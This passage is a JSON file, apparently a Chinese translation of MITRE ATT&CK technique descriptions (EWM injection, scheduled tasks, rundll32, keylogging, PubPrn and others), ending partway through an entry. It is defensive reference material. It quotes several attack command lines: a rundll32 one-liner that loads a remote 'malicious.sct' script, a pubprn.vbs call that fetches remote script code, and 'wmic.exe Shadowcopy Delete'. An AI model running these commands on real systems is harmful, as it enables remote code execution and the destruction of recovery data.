{
    "Extra Window Memory Injection": {
        "translated_name": "额外窗口内存注入",
        "translated_description": "对手可能通过额外窗口内存（EWM）注入恶意代码，以规避基于进程的防御措施并可能提升权限。EWM注入是一种在单独的活动进程的地址空间中执行任意代码的方法。\n\n在创建窗口之前，基于图形的Windows进程必须遵循或注册一个窗口类，该类规定了外观和行为（通过窗口过程，这些过程是处理数据输入/输出的函数）。(引用: Microsoft Window Classes) 新窗口类的注册可以包括请求将最多40字节的EWM附加到该类每个实例的分配内存中。这个EWM旨在存储特定于该窗口的数据，并具有特定的应用程序编程接口（API）函数来设置和获取其值。(引用: Microsoft GetWindowLong function) (引用: Microsoft SetWindowLong function)\n\n尽管很小，但EWM足够存储一个32位指针，通常用于指向一个窗口过程。恶意软件可能会利用这个内存位置作为攻击链的一部分，包括将代码写入进程内存的共享部分，将指针放置在EWM中，然后通过将执行控制返回到进程的EWM中的地址来调用执行。\n\n通过EWM注入授予的执行可能允许访问目标进程的内存并可能提升权限。将有效负载写入共享部分还可以避免使用高度监控的API调用，如<code>WriteProcessMemory</code>和<code>CreateRemoteThread</code>。(引用: Elastic Process Injection July 2017) 更复杂的恶意软件样本还可能通过触发一系列窗口过程和其他系统函数，将恶意负载重写到目标进程的可执行部分，从而绕过数据执行保护（DEP）等保护机制。(引用: MalwareTech Power Loader Aug 2013) (引用: WeLiveSecurity Gapz and Redyms Mar 2013)\n\n在另一个进程的上下文中运行代码可能允许访问该进程的内存、系统/网络资源，并可能提升权限。通过EWM注入的执行还可以规避安全产品的检测，因为执行被掩盖在合法进程下。"
    },
    "Scheduled Task": {
        "translated_name": "计划任务",
        "translated_description": "对手可能会滥用Windows任务计划程序来执行任务调度，以初始或定期执行恶意代码。有多种方法可以访问Windows中的任务计划程序。可以直接在命令行上运行[schtasks](https://attack.mitre.org/software/S0111)实用程序，或者可以通过控制面板中的管理工具部分打开任务计划程序的GUI。(引用: Stack Overflow) 在某些情况下，对手使用了Windows任务计划程序的.NET包装器，或者使用了Windows netapi32库和[Windows管理工具](https://attack.mitre.org/techniques/T1047) (WMI)来创建计划任务。对手还可以利用Powershell Cmdlet `Invoke-CimMethod`，该Cmdlet利用WMI类`PS_ScheduledTask`通过XML路径创建计划任务。(引用: Red Canary - Atomic Red Team)\n\n对手可能会使用Windows任务计划程序在系统启动时或定期执行程序以保持持久性。Windows任务计划程序还可以被滥用以进行远程执行作为横向移动的一部分，或在指定帐户（如SYSTEM）的上下文中运行进程。类似于[系统二进制代理执行](https://attack.mitre.org/techniques/T1218)，对手还滥用了Windows任务计划程序，以便在签名/受信任的系统进程下掩盖一次性执行。(引用: ProofPoint Serpent)\n\n对手还可能创建“隐藏”计划任务（即[隐藏工件](https://attack.mitre.org/techniques/T1564)），这些任务可能对防御工具和用于枚举任务的手动查询不可见。具体来说，对手可能通过删除关联的安全描述符（SD）注册表值（删除此值必须使用SYSTEM权限完成）来隐藏任务。(引用: SigmaHQ)(引用: Tarrask scheduled task) 对手还可能采用其他方法隐藏任务，例如更改关联注册表项中的元数据（例如`Index`值）。(引用: Defending Against Scheduled Task Attacks in Windows Environments)"
    },
    "Socket Filters": {
        "translated_name": "套接字过滤器",
        "translated_description": "对手可能会将过滤器附加到网络套接字，以监视然后激活用于持久性或命令和控制的后门。具有提升权限的对手可以使用诸如`libpcap`库之类的功能打开套接字并安装过滤器，以允许或禁止某些类型的数据通过套接字。过滤器可能适用于通过指定网络接口（如果未指定，则适用于每个接口）的所有流量。当网络接口接收到与过滤器条件匹配的数据包时，可以在主机上触发其他操作，例如激活反向shell。\n\n为了建立连接，对手会向目标主机发送与安装的过滤器条件匹配的精心制作的数据包。(引用: haking9 libpcap network sniffing) 对手已经使用这些套接字过滤器来触发植入物的安装、进行ping返回以及调用命令shell。与[协议隧道](https://attack.mitre.org/techniques/T1572)结合使用时，这些套接字过滤器的通信也可能被使用。(引用: exatrack bpf filters passive backdoors)(引用: Leonardo Turla Penquin May 2020)\n\n可以在安装了`libpcap`的任何类Unix平台上或在使用`Winpcap`的Windows主机上安装过滤器。对手可以使用`libpcap`与`pcap_setfilter`或标准库函数`setsockopt`与`SO_ATTACH_FILTER`选项。由于套接字连接在接收到数据包之前未激活，因此由于主机上的活动缺乏、CPU开销低以及对原始套接字使用的可见性有限，这种行为可能难以检测。"
    },
    "Archive via Utility": {
        "translated_name": "通过实用程序归档",
        "translated_description": "对手可能会使用实用程序在外传之前压缩和/或加密收集的数据。许多实用程序包括压缩、加密或以更易于/更安全的格式传输数据的功能。\n\n对手可能会滥用各种实用程序在外传之前压缩或加密数据。一些第三方实用程序可能是预安装的，例如Linux和macOS上的<code>tar</code>或Windows系统上的<code>zip</code>。\n\n在Windows上，<code>diantz</code>或<code>makecab</code>可以用于将收集的文件打包成一个柜文件（.cab）。<code>diantz</code>还可以用于从远程位置下载和压缩文件（即[远程数据暂存](https://attack.mitre.org/techniques/T1074/002)）。(引用: diantz.exe_lolbas) Windows上的<code>xcopy</code>可以使用各种选项复制文件和目录。此外，对手可能会使用[certutil](https://attack.mitre.org/software/S0160)在外传之前对收集的数据进行Base64编码。\n\n对手还可能使用第三方实用程序，例如7-Zip、WinRAR和WinZip，来执行类似的活动。(引用: 7zip Homepage)(引用: WinRAR Homepage)(引用: WinZip Homepage)"
    },
    "VNC": {
        "translated_name": "VNC",
        "translated_description": "对手可能会使用[有效帐户](https://attack.mitre.org/techniques/T1078)通过虚拟网络计算（VNC）远程控制计算机。VNC是一种跨平台的桌面共享系统，使用RFB（“远程帧缓冲”）协议，通过网络中继屏幕、鼠标和键盘输入，使用户能够远程控制另一台计算机的显示。(引用: The Remote Framebuffer Protocol)\n\nVNC与[远程桌面协议](https://attack.mitre.org/techniques/T1021/001)不同，VNC是屏幕共享软件，而不是资源共享软件。默认情况下，VNC使用系统的身份验证，但可以配置为使用特定于VNC的凭据。(引用: MacOS VNC software for Remote Desktop)(引用: VNC Authentication)\n\n对手可能会滥用VNC以登录用户的身份执行恶意操作，例如打开文档、下载文件和运行任意命令。对手可以使用VNC远程控制和监视系统，以收集数据和信息，并在网络内的其他系统之间进行横向移动。特定的VNC库/实现也容易受到暴力攻击和内存使用漏洞的影响。(引用: Hijacking VNC)(引用: macOS root VNC login without authentication)(引用: VNC Vulnerabilities)(引用: Offensive Security VNC Authentication Check)(引用: Attacking VNC Servers PentestLab)(引用: Havana authentication bug)"
    },
    "Windows Management Instrumentation": {
        "translated_name": "Windows管理规范",
        "translated_description": "对手可能会滥用Windows管理规范（WMI）来执行恶意命令和负载。WMI是为程序员设计的，是Windows系统上管理数据和操作的基础设施。(引用: WMI 1-3) WMI是一种管理功能，提供了一个统一的环境来访问Windows系统组件。\n\nWMI服务支持本地和远程访问，后者通过[远程服务](https://attack.mitre.org/techniques/T1021)如[分布式组件对象模型](https://attack.mitre.org/techniques/T1021/003)和[Windows远程管理](https://attack.mitre.org/techniques/T1021/006)来实现。(引用: WMI 1-3) 远程WMI通过DCOM使用135端口，而通过WinRM使用HTTP时使用5985端口，使用HTTPS时使用5986端口。(引用: WMI 1-3) (引用: Mandiant WMI)\n\n对手可以使用WMI与本地和远程系统交互，并将其作为执行各种行为的手段，例如用于[发现](https://attack.mitre.org/tactics/TA0007)以及[执行](https://attack.mitre.org/tactics/TA0002)命令和负载。(引用: Mandiant WMI) 例如，可以通过命令`wmic.exe Shadowcopy Delete`（即[抑制系统恢复](https://attack.mitre.org/techniques/T1490)）滥用`wmic.exe`删除影子副本。(引用: WMI 6)\n\n**注意：** `wmic.exe`自2024年1月起已被弃用，WMIC功能在Windows 11+上“默认禁用”。WMIC将从后续的Windows版本中移除，并由[PowerShell](https://attack.mitre.org/techniques/T1059/001)作为主要的WMI接口替代。(引用: WMI 7,8) 除了PowerShell和`wbemtool.exe`等工具外，还可以通过C++、.NET、VBScript等编程语言使用COM API与WMI进行编程交互。(引用: WMI 7,8)"
    },
    "Screen Capture": {
        "translated_name": "屏幕捕获",
        "translated_description": "对手可能会尝试捕获桌面的屏幕截图，以在操作过程中收集信息。屏幕捕获功能可能作为远程访问工具的一部分包含在内，用于后期妥协操作。通过本机实用程序或API调用（如<code>CopyFromScreen</code>、<code>xwd</code>或<code>screencapture</code>）通常也可以进行屏幕截图。(引用: CopyFromScreen .NET)(引用: Antiquated Mac Malware)\n"
    },
    "Fileless Storage": {
        "translated_name": "无文件存储",
        "translated_description": "对手可能会将数据存储在“无文件”格式中，以隐藏恶意活动免受防御措施的检测。无文件存储可以广泛定义为任何文件以外的格式。Windows系统中常见的非易失性无文件存储示例包括Windows注册表、事件日志或WMI存储库。(引用: Microsoft Fileless)(引用: SecureList Fileless) 在Linux系统中，共享内存目录如`/dev/shm`、`/run/shm`、`/var/run`和`/var/lock`也可以被视为无文件存储，因为写入这些目录的文件直接映射到RAM而不是存储在磁盘上。(引用: Elastic Binary Executed from Shared Memory Directory)(引用: Akami Frog4Shell 2024)(引用: Aquasec Muhstik Malware 2024)\n\n类似于无文件内存行为（如[反射代码加载](https://attack.mitre.org/techniques/T1620)和[进程注入](https://attack.mitre.org/techniques/T1055)），无文件数据存储可能不会被只能访问特定磁盘存储文件格式的防病毒和其他端点安全工具检测到。利用无文件存储还可以使对手绕过Linux中只读文件系统提供的保护。(引用: Sysdig Fileless Malware 23022)\n\n对手可能会使用无文件存储来隐藏各种类型的存储数据，包括负载/外壳代码（可能用于[持久性](https://attack.mitre.org/tactics/TA0003)）和尚未从受害者处外传的收集数据（例如，[本地数据暂存](https://attack.mitre.org/techniques/T1074/001)）。对手还经常在存储时加密、编码、拼接或以其他方式混淆这些无文件数据。\n\n某些形式的无文件存储活动可能会间接在文件系统中创建工件，但以中央和其他难以检查的格式存在，例如WMI（例如，`%SystemRoot%\\System32\\Wbem\\Repository`）或注册表（例如，`%SystemRoot%\\System32\\Config`）物理文件。(引用: Microsoft Fileless)"
    },
    "Boot or Logon Initialization Scripts": {
        "translated_name": "启动或登录初始化脚本",
        "translated_description": "对手可能会使用在启动或登录初始化时自动执行的脚本来建立持久性。(引用: Mandiant APT29 Eye Spy Email Nov 22)(引用: Anomali Rocke March 2019) 初始化脚本可用于执行管理功能，通常可以执行其他程序或将信息发送到内部日志服务器。这些脚本可能因操作系统和本地或远程应用而异。\n\n对手可能会使用这些脚本在单个系统上保持持久性。根据登录脚本的访问配置，可能需要本地凭据或管理员帐户。\n\n对手还可能能够提升其权限，因为某些启动或登录初始化脚本以更高的权限运行。"
    },
    "Adversary-in-the-Middle": {
        "translated_name": "中间人攻击",
        "translated_description": "对手可能会尝试使用中间人攻击（AiTM）技术在两个或多个网络设备之间定位自己，以支持后续行为，如[网络嗅探](https://attack.mitre.org/techniques/T1040)、[传输数据操作](https://attack.mitre.org/techniques/T1565/002)或重放攻击（[凭证访问利用](https://attack.mitre.org/techniques/T1212)）。通过滥用常见网络协议的功能，这些协议可以确定网络流量的流向（例如ARP、DNS、LLMNR等），对手可能会强制设备通过对手控制的系统进行通信，以便他们可以收集信息或执行其他操作。(引用: Rapid7 MiTM Basics)\n\n例如，对手可能会操纵受害者的DNS设置，以启用其他恶意活动，如阻止/重定向用户访问合法网站和/或推送其他恶意软件。(引用: ttint_rat)(引用: dns_changer_trojans)(引用: ad_blocker_with_miner) 对手还可能操纵DNS并利用其位置来拦截用户凭据，包括访问令牌（[窃取应用程序访问令牌](https://attack.mitre.org/techniques/T1528)）和会话Cookie（[窃取Web会话Cookie](https://attack.mitre.org/techniques/T1539)）。(引用: volexity_0day_sophos_FW)(引用: Token tactics) [降级攻击](https://attack.mitre.org/techniques/T1562/010)也可以用来建立AiTM位置，例如通过协商不太安全、已弃用或较弱版本的通信协议（SSL/TLS）或加密算法。(引用: mitm_tls_downgrade_att)(引用: taxonomy_downgrade_att_tls)(引用: tlseminar_downgrade_att)\n\n对手还可能利用AiTM位置尝试监视和/或修改流量，例如在[传输数据操作](https://attack.mitre.org/techniques/T1565/002)中。对手可以设置类似于AiTM的位置，以防止流量流向适当的目的地，可能是为了[削弱防御](https://attack.mitre.org/techniques/T1562)和/或支持[网络拒绝服务](https://attack.mitre.org/techniques/T1498)。"
    },
    "System Owner/User Discovery": {
        "translated_name": "系统所有者/用户发现",
        "translated_description": "对手可能会尝试识别主要用户、当前登录用户、通常使用系统的用户集或用户是否正在积极使用系统。例如，他们可以通过检索帐户用户名或使用[操作系统凭证转储](https://attack.mitre.org/techniques/T1003)来实现。可以通过使用其他发现技术以多种不同方式收集信息，因为用户和用户名详细信息在整个系统中普遍存在，包括运行进程所有权、文件/目录所有权、会话信息和系统日志。对手可能会在自动发现期间使用[系统所有者/用户发现](https://attack.mitre.org/techniques/T1033)中的信息来塑造后续行为，包括对手是否完全感染目标和/或尝试特定操作。\n\n各种实用程序和命令可以获取此信息，包括<code>whoami</code>。在macOS和Linux中，可以使用<code>w</code>和<code>who</code>命令识别当前登录的用户。在macOS上，还可以使用<code>dscl . list /Users | grep -v '_'</code>命令枚举用户帐户。环境变量，如<code>%USERNAME%</code>和<code>$USER</code>，也可以用来访问此信息。\n\n在网络设备上，可以使用[网络设备CLI](https://attack.mitre.org/techniques/T1059/008)命令，如`show users`和`show ssh`来显示当前登录到设备的用户。(引用: show_ssh_users_cmd_cisco)(引用: US-CERT TA18-106A Network Infrastructure Devices 2018)"
    },
    "Acquire Infrastructure": {
        "translated_name": "获取基础设施",
        "translated_description": "对手可能会购买、租赁、租用或获取可用于目标的基础设施。存在多种用于托管和协调对手操作的基础设施解决方案。基础设施解决方案包括物理或云服务器、域和第三方网络服务。(引用: TrendmicroHideoutsLease) 一些基础设施提供商提供免费试用期，使基础设施获取成本有限甚至免费。(引用: Free Trial PurpleUrchin) 此外，僵尸网络也可以租用或购买。\n\n使用这些基础设施解决方案可以使对手发起、启动和执行操作。解决方案可能有助于对手操作与被视为正常的流量混合，例如联系第三方网络服务或获取支持[代理](https://attack.mitre.org/techniques/T1090)的基础设施，包括来自住宅代理服务的基础设施。(引用: amnesty_nso_pegasus)(引用: FBI Proxies Credential Stuffing)(引用: Mandiant APT29 Microsoft 365 2022) 根据实施情况，对手可能会使用难以物理追溯到他们的基础设施，并利用可以快速配置、修改和关闭的基础设施。"
    },
    "Rundll32": {
        "translated_name": "Rundll32",
        "translated_description": "对手可能会滥用rundll32.exe来代理执行恶意代码。使用rundll32.exe，而不是直接执行（即[共享模块](https://attack.mitre.org/techniques/T1129)），可能会避免触发安全工具，因为这些工具可能不会监控rundll32.exe进程的执行，因为白名单或正常操作的误报。rundll32.exe通常与执行DLL有效负载相关（例如：<code>rundll32.exe {DLLname, DLLfunction}</code>）。\n\nrundll32.exe还可以用于执行[控制面板](https://attack.mitre.org/techniques/T1218/002)项目文件（.cpl），通过未记录的shell32.dll函数<code>Control_RunDLL</code>和<code>Control_RunDLLAsUser</code>。双击.cpl文件也会导致rundll32.exe执行。(引用: Trend Micro CPL) 例如，[ClickOnce](https://attack.mitre.org/techniques/T1127/002)可以通过Rundll32.exe代理。\n\nrundll32还可以用于执行诸如JavaScript之类的脚本。这可以使用类似于以下的语法完成：<code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code> 这种行为已被Poweliks等恶意软件使用。(引用: This is Security Command Line Confusion)\n\n对手还可能试图通过滥用rundll32.exe加载DLL函数名称的方式来掩盖恶意代码的分析。作为Windows对各种字符集的兼容性支持的一部分，rundll32.exe将在加载指定函数之前首先检查宽/Unicode然后是ANSI字符支持的函数（例如，给定命令<code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>，rundll32.exe将首先尝试执行<code>ExampleFunctionW</code>，如果失败则<code>ExampleFunctionA</code>，然后加载<code>ExampleFunction</code>）。因此，对手可能通过创建多个相同的导出函数名称并将<code>W</code>和/或<code>A</code>附加到无害的名称上来掩盖恶意代码。(引用: Attackify Rundll32.exe Obscurity)(引用: Github NoRunDll) DLL函数也可以通过序号导出并执行（例如：<code>rundll32.exe file.dll,#1</code>）。\n\n此外，对手可能会使用[伪装](https://attack.mitre.org/techniques/T1036)技术（例如更改DLL文件名、文件扩展名或函数名）进一步隐藏恶意有效负载的执行。(引用: rundll32.exe defense evasion)"
    },
    "Container and Resource Discovery": {
        "translated_name": "容器和资源发现",
        "translated_description": "对手可能会尝试发现容器和容器环境中可用的其他资源。其他资源可能包括镜像、部署、Pod、节点以及有关集群状态的其他信息。\n\n这些资源可以在Kubernetes仪表板等Web应用程序中查看，也可以通过Docker和Kubernetes API进行查询。(引用: Docker API)(引用: Kubernetes API) 在Docker中，日志可能会泄露有关环境的信息，例如环境的配置、可用的服务以及受害者可能使用的云提供商。对这些资源的发现可能会告知对手在环境中的下一步操作，例如如何执行横向移动以及使用哪些方法进行执行。"
    },
    "Serverless": {
        "translated_name": "无服务器",
        "translated_description": "对手可能会入侵无服务器云基础设施，例如Cloudflare Workers、AWS Lambda函数或Google Apps Scripts，这些基础设施可以在目标过程中使用。通过利用无服务器基础设施，对手可以更难将操作中使用的基础设施归因于他们。\n\n一旦被入侵，无服务器运行时环境可以用来直接响应受感染的机器或将流量[代理](https://attack.mitre.org/techniques/T1090)到对手控制的命令和控制服务器。(引用: BlackWater Malware Cloudflare Workers)(引用: AWS Lambda Redirector)(引用: GWS Apps Script Abuse 2021) 由于这些函数生成的流量将显示来自常见云提供商的子域，因此可能难以与普通流量区分开来——使其更容易[隐藏基础设施](https://attack.mitre.org/techniques/T1665)。(引用: Detecting Command & Control in the Cloud)(引用: BlackWater Malware Cloudflare Workers)"
    },
    "Standard Encoding": {
        "translated_name": "标准编码",
        "translated_description": "对手可能会使用标准数据编码系统对数据进行编码，以使命令和控制流量的内容更难检测。命令和控制（C2）信息可以使用符合现有协议规范的标准数据编码系统进行编码。常见的数据编码方案包括ASCII、Unicode、十六进制、Base64和MIME。(引用: Wikipedia Binary-to-text Encoding)(引用: Wikipedia Character Encoding) 一些数据编码系统还可能导致数据压缩，例如gzip。"
    },
    "Embedded Payloads": {
        "translated_name": "嵌入式有效负载",
        "translated_description": "对手可能会将有效负载嵌入其他文件中，以隐藏恶意内容以避开防御。看似无害的文件（如脚本和可执行文件）可能会被滥用来携带和混淆恶意有效负载和内容。在某些情况下，嵌入式有效负载还可能通过不影响执行控制（如数字签名和公证票据）来[颠覆信任控制](https://attack.mitre.org/techniques/T1553)。(引用: Sentinel Labs)\n\n对手可能会将有效负载嵌入各种文件格式中以隐藏有效负载。(引用: Microsoft Learn) 这类似于[隐写术](https://attack.mitre.org/techniques/T1027/003)，但不涉及将恶意内容编织到与合法数字媒体格式相关的特定字节和模式中。(引用: GitHub PSImage)\n\n例如，对手已被观察到将有效负载嵌入或作为看似无害的二进制文件的覆盖。(引用: Securelist Dtrack2) 对手还被观察到在同一格式的文件中嵌套有效负载（如可执行文件和仅运行脚本）。(引用: SentinelLabs reversing run-only applescripts 2021)\n\n嵌入的内容还可以用作[进程注入](https://attack.mitre.org/techniques/T1055)有效负载，用于感染无害的系统进程。(引用: Trend Micro) 这些嵌入然后注入的有效负载可能用作恶意软件模块的一部分，旨在提供特定功能，例如加密C2通信以支持协调器模块。例如，嵌入的模块可能会注入默认浏览器，允许对手然后通过网络进行通信。(引用: Malware Analysis Report ComRAT)"
    },
    "Pluggable Authentication Modules": {
        "translated_name": "可插拔认证模块",
        "translated_description": "对手可能会修改可插拔认证模块（PAM）以访问用户凭据或启用其他不必要的帐户访问。PAM是一个模块化的配置文件、库和可执行文件系统，用于指导许多服务的认证。最常见的认证模块是<code>pam_unix.so</code>，它在<code>/etc/passwd</code>和<code>/etc/shadow</code>中检索、设置和验证帐户认证信息。(引用: Apple PAM)(引用: Man Pam_Unix)(引用: Red Hat PAM)\n\n对手可能会修改PAM系统的组件以创建后门。PAM组件（如<code>pam_unix.so</code>）可以被修补以接受对手提供的任意值作为合法凭据。(引用: PAM Backdoor)\n\n对PAM系统的恶意修改也可能被滥用来窃取凭据。对手可能会感染PAM资源以收集用户凭据，因为与PAM组件交换的值可能是明文的，因为PAM不存储密码。(引用: PAM Creds)(引用: Apple PAM)"
    },
    "Revert Cloud Instance": {
        "translated_name": "还原云实例",
        "translated_description": "对手可能会在执行恶意活动后还原对云实例所做的更改，以试图逃避检测并删除其存在的证据。在高度虚拟化的环境中，例如基于云的基础设施，这可以通过通过云管理仪表板或云API恢复虚拟机（VM）或数据存储快照来实现。\n\n这种技术的另一种变体是利用附加到计算实例的临时存储。大多数云提供商提供各种类型的存储，包括持久性、本地和/或临时存储，临时类型通常在VM停止/重启时重置。(引用: Tech Republic - Restore AWS Snapshots)(引用: Google - Restore Cloud Snapshot)"
    },
    "Gather Victim Host Information": {
        "translated_name": "收集受害者主机信息",
        "translated_description": "对手可能会收集有关受害者主机的信息，以便在目标过程中使用。有关主机的信息可能包括各种详细信息，包括管理数据（例如：名称、分配的IP、功能等）以及有关其配置的具体信息（例如：操作系统、语言等）。\n\n对手可能会通过各种方式收集这些信息，例如通过[主动扫描](https://attack.mitre.org/techniques/T1595)或[钓鱼获取信息](https://attack.mitre.org/techniques/T1598)进行直接收集操作。对手还可能会入侵网站，然后在其中包含旨在从访问者那里收集主机信息的恶意内容。(引用: ATT ScanBox) 有关主机的信息也可能通过在线或其他可访问的数据集（例如：[社交媒体](https://attack.mitre.org/techniques/T1593/001)或[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594)）暴露给对手。收集这些信息可能会揭示其他形式的侦察（例如：[搜索开放网站/域](https://attack.mitre.org/techniques/T1593)或[搜索开放技术数据库](https://attack.mitre.org/techniques/T1596)）、建立操作资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587)或[获取能力](https://attack.mitre.org/techniques/T1588)）和/或初始访问（例如：[供应链妥协](https://attack.mitre.org/techniques/T1195)或[外部远程服务](https://attack.mitre.org/techniques/T1133)）的机会。\n\n对手还可能通过User-Agent HTTP头收集受害者主机信息，这些头会发送到服务器以标识请求用户代理的应用程序、操作系统、供应商和/或版本。这可以用来告知对手的后续行动。例如，对手可能会检查用户代理以获取请求操作系统，然后仅为目标操作系统提供恶意软件，而忽略其他操作系统。(引用: TrellixQakbot)"
    },
    "Digital Certificates": {
        "translated_name": "数字证书",
        "translated_description": "对手可能会创建自签名的SSL/TLS证书，这些证书可以在目标过程中使用。SSL/TLS证书旨在建立信任。它们包括有关密钥的信息、有关其所有者身份的信息以及验证证书内容正确性的实体的数字签名。如果签名有效，并且检查证书的人信任签名者，那么他们就知道可以使用该密钥与其所有者通信。在自签名的情况下，数字证书将缺乏与第三方证书颁发机构（CA）签名相关的信任元素。\n\n对手可能会创建自签名的SSL/TLS证书，以进一步他们的操作，例如加密C2流量（例如：[非对称加密](https://attack.mitre.org/techniques/T1573/002)与[Web协议](https://attack.mitre.org/techniques/T1071/001)）或甚至启用[中间人攻击](https://attack.mitre.org/techniques/T1557)（如果添加到信任根目录中，即[安装根证书](https://attack.mitre.org/techniques/T1553/004)）。\n\n在创建数字证书后，对手可能会在其控制的基础设施上安装该证书（参见[安装数字证书](https://attack.mitre.org/techniques/T1608/003)）。"
    },
    "Keylogging": {
        "translated_name": "键盘记录",
        "translated_description": "对手可能会记录用户的按键，以在用户输入凭据时拦截凭据。当[操作系统凭据转储](https://attack.mitre.org/techniques/T1003)无效时，键盘记录可能会用于获取新访问机会的凭据，并且可能需要对手在系统上拦截按键一段时间才能成功捕获凭据。为了增加快速捕获凭据的可能性，对手还可能执行诸如清除浏览器Cookie以强制用户重新认证系统的操作。(引用: Talos Kimsuky Nov 2021)\n\n键盘记录是最常见的输入捕获类型，具有多种拦截按键的方法。(引用: Adventures of a Keystroke) 一些方法包括：\n\n* 挂钩用于处理按键的API回调。与[凭据API挂钩](https://attack.mitre.org/techniques/T1056/004)不同，这主要关注用于处理按键数据的API函数。\n* 从硬件缓冲区读取原始按键数据。\n* Windows注册表修改。\n* 自定义驱动程序。\n* [修改系统镜像](https://attack.mitre.org/techniques/T1601)可能为对手提供挂钩到网络设备操作系统的机会，以读取登录会话的原始按键。(引用: Cisco Blog Legacy Device Attacks)"
    },
    "File/Path Exclusions": {
        "translated_name": "文件/路径排除",
        "translated_description": "对手可能会尝试通过将文件写入特定文件夹或文件名来隐藏其基于文件的工件，这些文件夹或文件名被排除在防病毒（AV）扫描和其他防御功能之外。为了优化性能以及简化应用程序的安装和合法使用，AV和其他基于文件的扫描器通常会包含排除项。这些排除项可能是上下文相关的（例如，扫描仅在特定触发事件/警报响应时启动），但通常也是硬编码字符串，引用特定文件夹和/或假定为可信和合法的文件。(引用: Microsoft File Folder Exclusions)\n\n对手可能会滥用这些排除项来隐藏其基于文件的工件。例如，对手可能会将其基于文件的有效负载放置在默认或其他众所周知的排除项中，而不是篡改工具设置以添加新的排除项（即，[禁用或修改工具](https://attack.mitre.org/techniques/T1562/001)）。对手还可能使用[安全软件发现](https://attack.mitre.org/techniques/T1518/001)和其他[发现](https://attack.mitre.org/tactics/TA0007)/[侦察](https://attack.mitre.org/tactics/TA0043)活动来发现和验证受害者环境中的现有排除项。"
    },
    "Linux and Mac File and Directory Permissions Modification": {
        "translated_name": "Linux 和 Mac 文件和目录权限修改",
        "translated_description": "对手可能会修改文件或目录权限/属性，以规避访问控制列表（ACL）并访问受保护的文件。(引用: Hybrid Analysis Icacls1 June 2018)(引用: Hybrid Analysis Icacls2 May 2018) 文件和目录权限通常由文件或目录所有者或具有适当权限的用户管理。文件和目录 ACL 实现因平台而异，但通常明确指定哪些用户或组可以执行哪些操作（读取、写入、执行等）。\n\n大多数 Linux 和基于 Linux 的平台提供一组标准的权限组（用户、组和其他）和一组标准的权限（读取、写入和执行），这些权限应用于每个组。虽然每个平台权限实现的细微差别可能有所不同，但大多数平台提供两个主要命令来操作文件和目录 ACL：<code>chown</code>（更改所有者的缩写）和<code>chmod</code>（更改模式的缩写）。\n\n如果当前权限允许，对手可能会使用这些命令使自己成为文件和目录的所有者或更改模式。他们随后可以将其他人锁定在文件之外。特定的文件和目录修改可能是许多技术的必要步骤，例如通过[Unix Shell 配置修改](https://attack.mitre.org/techniques/T1546/004)建立持久性或通过[劫持执行流](https://attack.mitre.org/techniques/T1574)污染/劫持其他重要的二进制/配置文件。(引用: 20 macOS Common Tools and Techniques)"
    },
    "Password Guessing": {
        "translated_name": "密码猜测",
        "translated_description": "对手在系统或环境中没有合法凭据的先验知识的情况下，可能会猜测密码以尝试访问帐户。在不知道帐户密码的情况下，对手可能会选择使用重复或迭代机制系统地猜测密码。对手可能会在操作期间使用常见密码列表猜测登录凭据，而无需事先了解系统或环境密码。密码猜测可能会或可能不会考虑目标的密码复杂性策略或使用可能在多次失败尝试后锁定帐户的策略。\n\n猜测密码可能是一种冒险的选择，因为它可能会导致大量身份验证失败和帐户锁定，具体取决于组织的登录失败策略。(引用: Cylance Cleaver)\n\n通常，在猜测密码时会使用常用端口上的管理服务。常见的目标服务包括：\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / 终端服务 (3389/TCP)\n* HTTP/HTTP 管理服务 (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP 和 162/TCP/UDP)\n\n除了管理服务之外，对手还可能“针对利用联合身份验证协议的单点登录 (SSO) 和基于云的应用程序”，以及外部电子邮件应用程序，例如 Office 365。(引用: US-CERT TA18-068A 2018)。此外，对手可能会滥用网络设备接口（例如 `wlanAPI`）通过无线身份验证协议对可访问的 wifi 路由器进行暴力破解。(引用: Trend Micro Emotet 2020)\n\n在默认环境中，LDAP 和 Kerberos 连接尝试不太可能触发事件，而 SMB 会创建 Windows“登录失败”事件 ID 4625。"
    },
    "PubPrn": {
        "translated_name": "PubPrn",
        "translated_description": "对手可能会使用 PubPrn 代理执行恶意远程文件。PubPrn.vbs 是一个 [Visual Basic](https://attack.mitre.org/techniques/T1059/005) 脚本，用于将打印机发布到 Active Directory 域服务。该脚本可能由 Microsoft 签名，通常通过 <code>Cscript.exe</code> 通过 [Windows 命令行](https://attack.mitre.org/techniques/T1059/003) 执行。例如，以下代码在指定域内发布打印机：<code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>。(引用: pubprn)\n\n对手可能会滥用 PubPrn 执行托管在远程站点上的恶意有效负载。(引用: Enigma0x3 PubPrn Bypass) 为此，对手可能会将第二个 <code>script:</code> 参数设置为引用托管在远程站点上的脚本文件 (.sct)。一个示例命令是 <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>。这种行为可能会绕过签名验证限制和不考虑滥用此脚本的应用程序控制解决方案。\n\n在 Windows 的较新版本（10+）中，<code>PubPrn.vbs</code> 已更新以防止代理执行来自远程站点的代码。这是通过将第二个参数中指定的协议限制为 <code>LDAP://</code>，而不是可以通过 HTTP(S) 引用远程代码的 <code>script:</code> 标识符来实现的。"
    },
    "Purchase Technical Data": {
        "translated_name": "购买技术数据",
